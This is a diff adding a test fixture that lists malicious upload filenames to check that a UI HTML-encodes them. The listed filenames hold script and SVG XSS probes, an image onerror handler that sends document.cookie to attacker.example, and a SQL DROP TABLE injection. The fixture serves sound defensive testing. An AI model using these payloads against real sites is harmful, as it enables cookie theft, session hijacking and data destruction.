@@ -1,0 +1,14 @@
+INERT FIXTURE — read as raw text only
+Purpose: documents filenames containing HTML/JS payloads that should be HTML-encoded before display.
+Threat: if any of the filenames below are rendered into an HTML template without htmlspecialchars()
+or framework escaping, the payload executes as a script.
+
+The following strings represent malicious filenames that an attacker may supply:
+
+  "><script>alert(1)</script>.jpg
+  <img src=x onerror=fetch('https://attacker.example/?c='+document.cookie)>.png
+  "><svg onload=alert(document.domain)>.pdf
+  '; DROP TABLE uploads; --.csv
+
+When testing, assert that displaying these filenames in the UI produces their literal text
+(HTML-encoded) and does not execute any script or event handler.
